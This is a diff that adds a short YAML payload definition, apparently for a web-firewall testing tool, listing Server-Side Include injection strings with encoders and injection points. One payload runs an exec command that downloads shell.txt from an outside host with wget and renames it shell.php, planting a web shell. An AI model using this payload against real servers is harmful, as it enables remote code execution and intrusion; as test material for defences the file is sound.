@@ -1,0 +1,9 @@
+payload:
+  - '<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->'
+  - '<!--#echo var="DOCUMENT_URI" -->'
+encoder:
+  - Base64Flat
+  - Url
+placeholder:
+  - UrlPath
+  - UrlParam
